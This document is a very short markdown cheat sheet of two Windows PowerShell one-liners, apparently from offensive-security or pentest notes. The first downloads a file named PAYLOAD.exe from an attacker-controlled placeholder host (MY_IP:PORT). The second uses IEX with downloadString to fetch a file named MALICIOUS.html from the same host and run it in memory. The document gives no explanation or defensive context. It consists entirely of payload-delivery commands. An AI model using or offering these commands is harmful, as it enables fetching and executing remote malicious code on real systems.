## Windows Powershell Commands:

#### 1) 

    powershell "(New-Object System.Net.WebClient).downloadFile('http://MY_IP:PORT/PAYLOAD.exe','PAYLOAD.exe')"

#### 2) 

    powershell "IEX(New-Object Net.WebClient).downloadString('http://MY_IP:PORT/MALICIOUS.html')"
